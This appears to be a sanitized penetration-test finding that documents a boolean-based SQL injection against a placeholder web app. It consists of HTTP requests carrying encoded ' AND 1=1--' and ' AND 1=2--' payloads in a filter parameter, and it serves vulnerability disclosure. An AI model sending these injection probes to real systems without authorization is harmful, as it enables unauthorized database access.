# F-01 Technical Validation

> Sanitized reconstruction. Paths, parameter names, identifiers, and response content below are neutral examples that preserve the tested security condition without reproducing the original target data.

## Baseline

```http
GET /items?filter=active HTTP/1.1
Host: app.example.test
Cookie: session=[redacted]
```

The application returned the expected result set.

## Boolean condition comparison

```http
GET /items?filter=active%27%20AND%201%3D1-- HTTP/1.1
Host: app.example.test
Cookie: session=[redacted]
```

The response remained consistent with the true condition.

```http
GET /items?filter=active%27%20AND%201%3D2-- HTTP/1.1
Host: app.example.test
Cookie: session=[redacted]
```

The application produced a repeatable response difference for the false condition.

## Security conclusion

Repeated true/false conditions caused deterministic behavioral differences, demonstrating that attacker-controlled input influenced backend SQL query logic.
